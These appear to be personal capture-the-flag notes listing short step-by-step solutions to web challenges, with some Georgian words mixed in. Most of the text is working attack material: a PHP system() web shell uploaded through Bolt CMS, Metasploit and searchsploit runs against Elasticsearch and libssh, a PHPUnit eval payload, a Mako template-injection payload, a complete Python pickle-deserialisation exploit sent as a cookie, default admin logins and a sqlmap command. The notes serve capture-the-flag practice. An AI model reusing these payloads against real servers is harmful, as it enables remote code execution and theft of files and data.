# dirsearch2
dirsearch
Bolt

1. view page saurce ( its written on bolt)
2. url/bolt
3. admin – password
4. file management – create file.txt enter - <?php echo system($_GET['cmd']);?>
5. rename flag.txt to file.php go to file
6. url = php?cmd=ls -l
7. php?cmd=cat /flag.txt
path traversal vulnerability 

Elastic ?

1. msfconsole 
2. search elasticsearch
3. use 3(an romelsac director traversial uweria
4. info
5. set rhost x.x.x.x
6. set rport yyyy
7. run
8. exit
9. cat grdzeli.txt
directory traversal 

Libssh

1. searchsploit libssh
2. searchsploit -m linux/remote/46307.py
3. python3 file 34.141.12.127  31367  "cd ..;cat flag.txt"
libSSH vulnerability 

Php unit

1. php unit cve (vulnerability)

1. dirsearch -u url 

2. url /composer.json

3. burp url/eval-stding.php

4. <?php system('cat /flag.txt')?>

path traversal 

Non-diff backdoor

1. Dirsearch -u url
2. Backup.zip
3. Wget url/backup.zip
4. Cd backup 
5. Grep -r “shell_exec(“
6. Cat ….php
7. url?welldone=knockknock&shazam=id 
8. =cat flag.php
9. View page source
10. 108zea
Shark

1. ${7*7}
2. Burp 
3. Submit something 
4. Name= 
<%
import os
x=os.popen(‘cat flag’).read()
%>
${x}
5. Repeater 
Vulnerability - Server Site Template Injection

Authorization

1. Python3 ./dirsearch.py -u link -w db/dicc.txt
2. /auth/client_secrets.json/robots.txt/secrets
3. Burp
4. Get -post
5. Data is In json format
6. { “username”:”admin”, “password":”admin”}
7. Get /secrets
content-type: application/json
Authorization: JWT
is ragac
vulnerability is in how the application handles user authentication and authorization JWT Implementation Issues

online-encryption

1. Traffic http filter
2. Hash 1427
3. Htlm 
4. Base64decode.org
5. Rot13.com (13 letter apart)
Poor encryption and basic obfuscation techniques are used in the handling of sensitive data during network transmission.

Sweet-and-sour

1. Curl -I link
2. Echo -n “cookie” | base64 -d
3. Nano ragaca.py
4. import pickle
import base64

import requests

 

 

class Exploit(object):

      def __reduce__ (self):

           return eval, ("open('flag', 'r').read()", )

 

def sendPayload (p):

      print (base64.urlsafe_b64encode(p))

      headers = {"Cookie":"data=" + base64.urlsafe_b64encode(p).decode ()}

      t = requests.get ("http://35.198.135.192:30562/dashboard", headers=headers)

     print (t. text)

 

sendPayload (pickle.dumps (Exploit(), protocol=2))

5. Python ragaca 
Schematics

1. Dirsearch -I link
2. %
3. Sqlmap –cookie=”PHPSESSID=…” -u link/index.php –forms –columns –random-agent
